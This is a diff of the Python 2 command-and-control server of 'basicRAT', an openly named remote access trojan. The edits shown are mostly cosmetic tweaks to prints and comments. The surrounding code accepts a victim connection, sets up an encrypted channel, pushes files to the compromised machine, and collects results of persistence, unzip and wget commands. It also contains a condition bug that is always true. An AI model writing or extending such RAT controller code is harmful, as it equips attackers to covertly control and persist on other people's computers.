@@ -69,17 +69,15 @@ def main():
         time.sleep(0.05)
         print line
 
-    print 'basicRAT server listening on port {}...\n'.format(port)
+    print 'basicRAT server listening on port {}...'.format(port)
 
     s.listen(10)
     conn, addr = s.accept()
 
     DHKEY = crypto.diffiehellman(conn, server=True)
-    # debug: confirm DHKEY matches
-    # print binascii.hexlify(DHKEY)
 
     while True:
-        prompt = raw_input('[{}] basicRAT> '.format(addr[0])).rstrip()
+        prompt = raw_input('\n[{}] basicRAT> '.format(addr[0])).rstrip()
 
         # allow noop
         if not prompt:
@@ -123,12 +121,11 @@ def main():
                 fname = fname.strip()
                 filesock.sendfile(conn, fname, DHKEY)
 
-        # regenerate DH key (dangerous! may cause connection loss!)
-        # available in case a fallback occurs or you suspect eavesdropping
+        # regenerate DH key
         elif cmd == 'rekey':
             DHKEY = crypto.diffiehellman(conn, server=True)
 
-        # results of persistence
+        # results of persistence, unzip, or wget
         elif cmd == 'persistence' or 'unzip' or 'wget':
             print 'Running {}...'.format(cmd)
             recv_data = conn.recv(1024)
